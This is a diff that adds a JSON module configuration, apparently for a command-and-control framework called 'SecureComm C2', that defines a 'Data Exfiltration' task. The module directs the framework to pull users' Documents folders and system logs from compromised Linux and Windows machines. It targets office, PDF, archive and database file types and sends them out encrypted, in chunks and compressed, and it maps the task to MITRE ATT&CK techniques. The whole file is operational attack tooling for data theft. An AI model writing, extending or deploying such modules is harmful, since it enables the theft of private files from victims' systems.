@@ -1,0 +1,42 @@
+{
+  "id": "data_exfiltration",
+  "name": "Data Exfiltration",
+  "description": "Download sensitive files from target system",
+  "version": "1.0",
+  "author": "SecureComm C2",
+  "category": "exfiltration",
+  "platform": "cross-platform",
+  "risk_level": "high",
+  "requires_admin": false,
+  "commands": [
+    {
+      "type": "download",
+      "payload": "/home/*/Documents/*",
+      "description": "Download user documents",
+      "timeout": 600,
+      "max_size": "100MB"
+    },
+    {
+      "type": "download",
+      "payload": "C:\\Users\\*\\Documents\\*",
+      "alt_payload": "/var/log/*",
+      "description": "Download logs or documents",
+      "timeout": 600,
+      "max_size": "100MB"
+    }
+  ],
+  "file_types": {
+    "target_extensions": [".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx", ".txt", ".csv"],
+    "archive_extensions": [".zip", ".tar", ".gz", ".7z"],
+    "database_extensions": [".db", ".sqlite", ".sql", ".mdb"]
+  },
+  "exfiltration_methods": ["direct", "chunked", "compressed"],
+  "encryption": {
+    "enabled": true,
+    "algorithm": "AES-256-GCM"
+  },
+  "mitre_techniques": ["T1041", "T1048", "T1567"],
+  "tags": ["exfiltration", "data-theft", "documents"],
+  "created_at": "2026-02-11T12:00:00Z",
+  "updated_at": "2026-02-11T12:00:00Z"
+}
